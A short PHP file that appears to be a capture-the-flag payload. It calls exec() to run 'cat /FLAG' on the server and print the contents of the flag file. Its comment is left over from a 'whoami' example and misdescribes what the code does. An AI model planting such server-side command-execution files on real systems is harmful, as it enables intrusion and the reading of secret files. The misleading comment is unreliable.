<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('cat /FLAG', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
